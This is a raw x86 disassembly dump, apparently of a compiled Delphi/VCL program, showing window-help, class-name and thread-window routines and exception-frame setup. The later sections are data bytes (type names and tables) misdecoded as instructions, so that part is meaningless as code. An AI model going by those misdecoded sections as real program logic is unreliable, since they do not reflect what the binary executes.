push sub_42e14f
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42e328
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42e158
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_42e243
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_42e3d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e24a
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403ed0
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407c7c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_42e328
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407c7c
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403f00
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42da8c
mov eax [ ebp - 0x14 ]
call sub_40436c
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_42e258
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408364
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_42e2b3
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408340
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_42e328
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push sub_42e39e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_42e30c
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e3a5
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407a0c
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_42e3b4
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_42e3d0
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_42e30c
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_42e3b0
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_42e3b4
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_42e42c
sub_42e42c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_42e4a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42de8c
call GetTickCount
mov ebx eax
push 0x0
call sub_40602c
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_42da8c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e4b0
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42e4b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c0
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4033fc
call sub_405500
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_42e500
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_42e52c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e59a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e5a1
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4054e8
mov eax rw-data
call sub_4054e8
mov eax rw-data
call sub_4054e8
mov eax rw-data
call sub_403eac
mov eax rw-data
call sub_4054e8
mov eax [ rw-data ]
call sub_42db5c
sub_42e5a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e5f6
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e5fd
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e4b8
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4054e8
mov edx eax
mov eax [ rw-data ]
call sub_423440
sub_42e86c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc edx
add [ eax ] al
add [ eax ] al
fsubr st7
inc edx
add [ eax ] ah
xor eax [ eax ]
pop esp
cmovae eax [ eax ]
adc [ eax ] 0x43
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add al ch
cmovae eax [ eax ]
sbb al 0x10
inc ebx
add [ eax + edx ] dh
inc ebx
add al bl
or eax 0xf900043
inc ebx
add [ ebp + ecx + 0x10400043 ] bl
inc ebx
add ah dh
push cs
inc ebx
add [ eax + 0x10 ] ah
inc ebx
add [ edi + ecx + 0xf6c0043 ] bh
inc ebx
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
inc ebx
add [ eax + 0x12 ] ah
inc ebx
add ah dl
push cs
inc ebx
outsd
outsb
je r-xdata
add ah bh
push cs
inc ebx
add [ ecx + edx + 0x43 ] dh
add [ eax + edx + 0x11bc0043 ] al
inc ebx
add [ eax ] bh
adc al [ ebx ]
dec esp
adc al [ ebx ]
insb
adc al [ ebx ]
adc [ esp + eax * 2 + 0x72 ] edx
popad
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
movsb [ edi ] [ esi ]
0x42 0x0
outsd
insb
jae r-xdata
inc ebx
add ah dh
push cs
inc ebx
add ah bh
push cs
inc ebx
add [ ecx + edx + 0x43 ] dh
add [ eax + edx + 0x11bc0043 ] al
inc ebx
add [ eax ] bh
adc al [ ebx ]
dec esp
adc al [ ebx ]
insb
adc al [ ebx ]
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 4 - 0x17 ] si
inc edx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 2 - 0x17 ] si
inc edx
add [ eax + 0x42e7 ] ch
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
push cs
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
inc esp
jmp r-xdata
add [ ebx + 0x42ea08c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0x42 ] al
add [ eax ] dh
add [ eax ] al
clc
call 0x3362ea2c
inc eax
add [ edi + ecx + 0x43 ] bl
add [ edx + edx + 0x43 ] dh
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x10e80040 ] ah
inc ebx
add al ch
cmovae eax [ eax ]
pushad
adc al [ ebx ]
aam 0xe
inc ebx
add al bl
or eax 0x11180043
inc ebx
add [ ebp + ecx + 0xef00043 ] bl
inc ebx
add ah dh
push cs
inc ebx
inc ebx
add al bl
or eax 0x11180043
inc ebx
add [ ebp + ecx + 0xef00043 ] bl
call 0xffffffffe8432c55
cmovae eax [ eax ]
pushad
adc al [ ebx ]
aam 0xe
sub_42e8b0
loopne r-xdata
inc esp
jb r-xdata
inc eax
add al ch
cmovae eax [ eax ]
sbb al 0x10
inc ebx
add [ eax + edx ] dh
inc ebx
add al bl
or eax 0xf900043
inc ebx
add [ ebp + ecx + 0x10400043 ] bl
inc ebx
add ah dh
push cs
inc ebx
add [ eax + 0x10 ] ah
inc ebx
add [ edi + ecx + 0xf6c0043 ] bh
inc ebx
add [ esp + edx * 2 ] dl
inc ebx
add [ eax + 0x12 ] ah
inc ebx
add ah dl
push cs
inc ebx
outsd
outsb
je r-xdata
add ah bh
push cs
inc ebx
add [ ecx + edx + 0x43 ] dh
add [ eax + edx + 0x11bc0043 ] al
inc ebx
add [ eax ] bh
adc al [ ebx ]
dec esp
adc al [ ebx ]
insb
adc al [ ebx ]
adc [ esp + eax * 2 + 0x72 ] edx
popad
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
movsb [ edi ] [ esi ]
0x42 0x0
outsd
insb
jae r-xdata
inc ebx
add ah dh
push cs
inc ebx
add ah bh
push cs
inc ebx
add [ ecx + edx + 0x43 ] dh
add [ eax + edx + 0x11bc0043 ] al
inc ebx
add [ eax ] bh
adc al [ ebx ]
dec esp
adc al [ ebx ]
insb
adc al [ ebx ]
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 4 - 0x17 ] si
inc edx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 2 - 0x17 ] si
inc edx
add [ eax + 0x42e7 ] ch
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
push cs
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
inc esp
jmp r-xdata
add [ ebx + 0x42ea08c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0x42 ] al
add [ eax ] dh
add [ eax ] al
clc
call 0x3362ea2c
inc eax
add [ edi + ecx + 0x43 ] bl
add [ edx + edx + 0x43 ] dh
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x10e80040 ] ah
inc ebx
add al ch
cmovae eax [ eax ]
pushad
adc al [ ebx ]
aam 0xe
inc ebx
add al bl
or eax 0x11180043
inc ebx
add [ ebp + ecx + 0xef00043 ] bl
inc ebx
add ah dh
push cs
inc ebx
inc ebx
add al bl
or eax 0x11180043
inc ebx
add [ ebp + ecx + 0xef00043 ] bl
call 0xffffffffe8432c55
cmovae eax [ eax ]
pushad
adc al [ ebx ]
aam 0xe
sub_42ea60
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr dl 0x1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0x640042 ] bh
add [ eax ] al
cmp [ eax + 0x33200041 ] 0x40
add [ ebx + esi ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x5c97ffc0 ] ah
inc ecx
add [ esi - 0x5c63ffbd ] dh
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
jae r-xdata
add [ eax ] al
add [ eax ] al
shr dl 0x1
inc edx
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
inc ecx
add ah dl
sub [ ebx ] al
shl [ ebx + 0x29800041 ] 0x1
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc ebx
add [ eax ] ah
mov [ 0xffffffffa3b40041 ] eax
inc ecx
add [ eax ] cl
movsb [ edi ] [ esi ]
inc ecx
add al al
daa
inc ebx
add al dh
std
inc ebx
add [ eax + ebp ] dh
inc ebx
add [ eax ] bl
inc [ ebx ]
sub al 0xfe
inc ebx
add [ ecx + ebp + 0x28680043 ] ch
inc ebx
add [ eax - 0x2 ] ch
inc ebx
add [ esi + edi * 8 + 0x43 ] bh
add [ eax - 0x5bffbcd8 ] ah
inc [ ebx ]
cld
sub [ ebx ] al
lodsb [ esi ]
inc [ ebx ]
sbb al 0x29
inc ebx
add [ esi + edi * 8 + 0x2a300043 ] dh
inc ebx
add [ eax ] dl
sub al [ ebx ]
push eax
sub al [ ebx ]
cmp al 0x29
inc ebx
add al cl
inc [ ebx ]
int3
push 0xb40041a3
inc ebx
add [ ebx + 0x28d40041 ] bl
inc ebx
add al dl
mov [ 0x29800041 ] eax
jae r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x24440040 ] ah
inc ebx
add [ eax + 0x3f ] al
inc ecx
add [ eax + 0x3f ] cl
inc ecx
add [ esi + edi + 0x41 ] bl
add [ eax ] bh
fadd [ ecx ]
and al 0xdc
inc ecx
add [ eax + 0x24 ] dh
inc ebx
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
xor eax [ eax ]
sub al 0x33
0xb8ec0042 0x41
sub_42eb1b
add [ eax + eax ] bl
add [ eax ] al
or bh dh
inc ebx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi - 0x5c97ffc0 ] ah
inc ecx
add [ esi - 0x5c63ffbd ] dh
inc ecx
add ah dl
sub [ ebx ] al
shl [ ebx + 0x29800041 ] 0x1
inc ebx
add [ eax ] ah
mov [ 0xffffffffa3b40041 ] eax
inc ecx
add [ eax ] cl
movsb [ edi ] [ esi ]
inc ecx
add al al
daa
inc ebx
add al dh
std
inc ebx
add [ eax + ebp ] dh
inc ebx
add [ eax ] bl
inc [ ebx ]
sub al 0xfe
inc ebx
add [ ecx + ebp + 0x28680043 ] ch
inc ebx
add [ eax - 0x2 ] ch
inc ebx
add [ esi + edi * 8 + 0x43 ] bh
add [ eax - 0x5bffbcd8 ] ah
inc [ ebx ]
cld
sub [ ebx ] al
lodsb [ esi ]
inc [ ebx ]
sbb al 0x29
inc ebx
add [ esi + edi * 8 + 0x2a300043 ] dh
inc ebx
add [ eax ] dl
sub al [ ebx ]
push eax
sub al [ ebx ]
cmp al 0x29
inc ebx
add al cl
inc [ ebx ]
int3
sub_42ed78
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
in eax dx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
in eax dx
inc edx
add [ eax ] ah
add [ eax ] al
add ah dh
adc al 0x41
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x3e300040 ] ah
inc ecx
add ah cl
and eax 0x3f480043
inc ecx
add [ esi + edi + 0x41 ] bl
add [ eax - 0x6fffbcda ] ah
and eax 0x54100043
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
dec ebp
popad
js r-xdata
popad
imul ebp [ esi + 0x74 ] r-xdata
in al dx
in eax dx
inc edx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
adc al 0x26
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
jne r-xdata
in eax dx
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
push esp
add [ eax + eax ] dl
add bh bh
adc al 0x26
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
test al 0xee
inc edx
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x42ed5474
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x42ef20c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
je r-xdata
inc edx
jne r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
in eax dx
inc edx
add [ eax ] dl
add [ eax ] al
call [ esi ]
imul ebp [ esi + 0x74 ] 0x42edc073
add [ eax + 0x15 ] ch
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
push ebx
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ ecx ] al
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
inc edx
outsd
insb
jae r-xdata
add ah dh
adc [ eax ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push 0xdc004010
or eax 0xd0900041
out dx eax
jb r-xdata
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ eax ] cl
add [ eax ] al
call [ esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ ebp + ebp * 8 + 0x42 ] dl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add ah dh
adc [ eax ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
imul esp [ edi + 0x68 ] 0x42ed5474
imul esp [ gs : edi + 0x68 ] 0x42ed5474
add [ eax + eax ] cl
add bh bh
adc al 0x26
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
or [ esi ] al
push ebx
outsb
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
hlt
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
inc edx
add [ eax ] cl
push cs
push esp
dec ebx
jns r-xdata
jb r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jbe r-xdata
hlt
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax - 0x14 ] dl
inc edx
add [ eax ] al
adc [ eax ] al
nop
xchg esp eax
outsb
je r-xdata
je r-xdata
jb r-xdata
hlt
add al dh
out 0x42 al
add [ ecx + esi * 8 ] bh
inc edx
add [ eax ] cl
or eax 0x646e4554
inc esp
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
je r-xdata
hlt
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
inc esp
jb r-xdata
add ah dh
adc [ eax ] al
sub [ eax ] dl
inc eax
add [ ebp - 0xff3ffc0 ] cl
inc edx
add [ eax ] cl
push cs
push esp
inc ebx
push 0xf4007261
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0xf0bffc0 ] cl
inc edx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
pop es
inc edx
outsd
outsd
insb
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
pop es
dec ecx
outsb
je r-xdata
inc esp
jb r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
jb r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
outsb
je r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
outsb
je r-xdata
jb r-xdata
jb r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
hlt
hlt
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x80042f1 ] bl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
nop
jmp 0xfffffffff38af388
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
